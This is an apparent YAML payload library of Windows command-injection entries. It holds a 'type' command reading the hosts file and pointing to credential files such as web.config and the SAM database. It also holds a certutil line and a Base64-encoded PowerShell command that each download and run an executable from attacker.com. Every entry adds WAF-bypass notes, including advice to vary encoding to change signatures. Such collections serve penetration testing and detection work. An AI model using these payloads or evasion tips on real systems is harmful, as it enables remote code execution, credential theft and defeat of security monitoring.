  - id: cmdi-win-006
    title: Type command for file read
    payload_string: '& type C:\Windows\System32\drivers\etc\hosts'
    how_it_works: 'The ''type'' command in Windows cmd.exe displays file contents, equivalent to Unix cat. Reading the hosts
      file reveals internal IP address mappings and virtual host configurations, providing network topology information. More
      sensitive targets include web.config (application credentials and connection strings), unattend.xml (Windows installation
      credentials), and SAM database files. The hosts file is always readable and provides immediate reconnaissance value.

      '
    prerequisites:
    - cmd.exe execution on Windows
    - Read access to target file
    waf_bypass_notes: type command is less commonly blocked than cat; try findstr for line filtering
    severity_context: CVSS 7.5 – Windows file read for network reconnaissance and credentials
    cve_refs: []
    tags:
    - windows
    - basic
    - file-read
    - type-command
    - reconnaissance
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-win-007
    title: Certutil for payload download
    payload_string: '& certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe'
    how_it_works: 'Windows Certutil is a legitimate certificate management tool that has become a well-known LOLBin (Living-Off-the-Land
      Binary) for downloading files. The -urlcache flag downloads a URL and caches it, effectively functioning as wget or
      curl. The -split flag handles binary data. After downloading, the executable runs from the Windows Temp directory. Certutil
      is signed by Microsoft and present on all Windows versions since XP, making it a trusted binary that may bypass application
      whitelisting controls.

      '
    prerequisites:
    - certutil.exe present (standard on all Windows)
    - Outbound HTTP to attacker server
    - Execute permission on Temp directory
    waf_bypass_notes: certutil is a signed LOLBin; often not blocked; monitor for certutil web access
    severity_context: CVSS 9.8 – file download and execute via LOLBin for payload delivery
    cve_refs: []
    tags:
    - windows
    - basic
    - certutil
    - lolbin
    - download-execute
    - persistence
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-win-008
    title: Windows CMDi via PowerShell Encoded Command
    payload_string: '& powershell -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcwBoAGUAbABsAC4AZQBIAGUAJwAsACcAQwA6AFwAVABlAG0AcABcAHMAaABlAGwAbAAuAGUAeABlACcAKQA=

      '
    encoding: base64-powershell
    how_it_works: 'PowerShell''s -EncodedCommand flag accepts a Base64-encoded UTF-16LE command string, completely bypassing
      signature-based detection and WAF rules that match plaintext PowerShell keywords like Invoke-Expression, DownloadFile,
      or WebClient. The encoded payload expands to a Net.WebClient DownloadFile call, fetching an attacker-controlled executable
      to the Windows Temp directory for execution. This LOLBin technique is commonly used in post-exploitation chains and
      is effective against application firewalls that only inspect cleartext command strings.

      '
    context_of_use: Windows CMDi where application invokes cmd.exe or directly spawns PowerShell
    prerequisites:
    - PowerShell accessible on target (present by default on Windows Vista+)
    - Outbound HTTP from server process to attacker
    waf_bypass_notes: Base64 encoding bypasses keyword-based WAF rules; vary padding to change signature
    severity_context: CVSS 9.8 – RCE via PowerShell encoded command enabling payload download and execution
    cve_refs: []
    tags:
    - windows
    - basic
    - powershell
    - encoded-command
    - lolbin
    - bypass
    date_added: '2024-01-01'
